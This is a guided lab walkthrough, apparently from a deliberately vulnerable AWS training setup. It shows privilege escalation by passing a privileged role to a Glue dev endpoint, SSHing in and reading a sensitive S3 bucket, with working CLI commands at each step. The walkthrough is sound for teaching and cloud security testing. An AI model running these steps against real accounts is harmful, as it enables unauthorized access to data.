# Guided Walkthrough: Privilege Escalation via iam:PassRole + glue:CreateDevEndpoint

This scenario demonstrates a privilege escalation vulnerability where a user has permissions to pass a role to AWS Glue (`iam:PassRole`) and create Glue development endpoints (`glue:CreateDevEndpoint`). By creating a development endpoint with a role that has S3 bucket access, an attacker can SSH into the endpoint and execute AWS CLI commands with the elevated permissions of the passed role.

AWS Glue development endpoints are interactive compute environments used for developing, testing, and debugging ETL scripts. When a development endpoint is created, it assumes the specified IAM role and makes those credentials available within the endpoint environment. An attacker who can SSH into the endpoint inherits these elevated permissions without needing to know the role's credentials directly.

This attack is particularly dangerous because Glue dev endpoints provide a persistent compute environment with internet connectivity, SSH access, and the ability to install arbitrary tools. Unlike ephemeral Lambda functions, dev endpoints remain running until explicitly deleted, giving attackers extended time to explore and exfiltrate data.

**Important Note:** Glue development endpoints only support Glue versions **0.9** and **1.0** (legacy versions). Newer Glue versions (2.0, 3.0, 4.0) are not supported for dev endpoints. This scenario uses Glue 1.0.

**Cost Warning:** This scenario creates a Glue development endpoint that costs approximately $2.20/hour while running (using minimum 2 node configuration). The demo script automatically cleans up the endpoint after demonstration, but if the script fails or is interrupted, you may incur ongoing charges until the endpoint is manually deleted. Always verify cleanup completion using `aws glue get-dev-endpoint`.

## The Challenge

You start as `pl-prod-glue-001-to-bucket-starting-user`, an IAM user with two key permissions: `iam:PassRole` on `pl-prod-glue-001-to-bucket-target-role`, and `glue:CreateDevEndpoint`. The target role has `s3:GetObject` and `s3:ListBucket` on the sensitive bucket `pl-sensitive-data-glue-001-{account_id}-{suffix}`.

Your goal is to read the contents of that S3 bucket. You cannot access the bucket directly as the starting user -- that permission lives on the target role. You need to find a way to act as that role.

## Reconnaissance

First, confirm your identity and verify you cannot access the target bucket directly:

```bash
aws sts get-caller-identity
# Should show pl-prod-glue-001-to-bucket-starting-user

aws s3 ls s3://pl-sensitive-data-glue-001-{account_id}-{suffix}
# Should return Access Denied
```

Now look at what permissions you actually have. You can pass a role to Glue and create dev endpoints -- that's your path forward. Let's find out what roles you can pass:

```bash
aws iam list-roles --query 'Roles[?contains(RoleName, `glue-001`)].RoleName'
```

You'll see `pl-prod-glue-001-to-bucket-target-role`. That's the role with S3 access. The plan is clear: create a Glue dev endpoint, pass it that role, and then SSH in to run AWS CLI commands with the role's credentials.

## Exploitation

### Step 1: Generate an SSH Key Pair

Glue dev endpoints require an SSH public key for authentication. Generate a throwaway key pair:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/glue_key -N ""
```

### Step 2: Create the Glue Dev Endpoint

Now create the dev endpoint, passing the target role and your SSH public key:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws glue create-dev-endpoint \
  --endpoint-name pl-glue-001-demo-endpoint \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-glue-001-to-bucket-target-role \
  --public-key "$(cat /tmp/glue_key.pub)" \
  --glue-version "1.0" \
  --number-of-nodes 2 \
  --region us-east-1
```

This is the exploitation step. AWS accepts the request because your user has `iam:PassRole` on the target role and `glue:CreateDevEndpoint`. Glue will provision a compute cluster and assume the target role automatically.

### Step 3: Wait for the Endpoint to Become Ready

Provisioning takes 5-10 minutes. Poll the status:

```bash
while true; do
  STATUS=$(aws glue get-dev-endpoint \
    --endpoint-name pl-glue-001-demo-endpoint \
    --query 'DevEndpoint.Status' \
    --output text)
  echo "Status: $STATUS"
  [ "$STATUS" = "READY" ] && break
  sleep 30
done
```

### Step 4: Retrieve the Endpoint's Public Address

Once the endpoint is `READY`, get its public SSH address:

```bash
aws glue get-dev-endpoint \
  --endpoint-name pl-glue-001-demo-endpoint \
  --query 'DevEndpoint.PublicAddress' \
  --output text
```

### Step 5: SSH In and Access the Bucket

Now SSH into the endpoint as the `glue` user:

```bash
ssh -i /tmp/glue_key \
  -o StrictHostKeyChecking=no \
  glue@<PublicAddress>
```

Once inside, confirm which role the endpoint is running as, then access the target bucket:

```bash
# Inside the endpoint SSH session:
aws sts get-caller-identity
# Should show pl-prod-glue-001-to-bucket-target-role

aws s3 ls s3://pl-sensitive-data-glue-001-{account_id}-{suffix}/

aws s3 cp s3://pl-sensitive-data-glue-001-{account_id}-{suffix}/sensitive-data.txt -
```

You now have full read access to the sensitive bucket -- using the target role's credentials running inside the Glue endpoint you created.

## Verification

From inside the SSH session, `aws sts get-caller-identity` should confirm you are operating as `pl-prod-glue-001-to-bucket-target-role`, not the starting user. The `aws s3 ls` and `aws s3 cp` commands should succeed and return the bucket's contents.

## What Happened

You exploited the combination of `iam:PassRole` and `glue:CreateDevEndpoint` to spin up a persistent compute environment that assumed a privileged IAM role on your behalf. The Glue service accepted the role because AWS trusts the `glue.amazonaws.com` service principal, and your starting user had explicit permission to pass that role to Glue.

This pattern appears in real environments when developers are granted broad Glue permissions to build ETL pipelines. The `iam:PassRole` permission is often granted too broadly, allowing any role to be passed rather than only roles intended for Glue use. Because dev endpoints persist until explicitly deleted and expose a public SSH interface, an attacker can maintain access for an extended period -- significantly longer than the ephemeral access provided by Lambda invocations or ECS tasks.
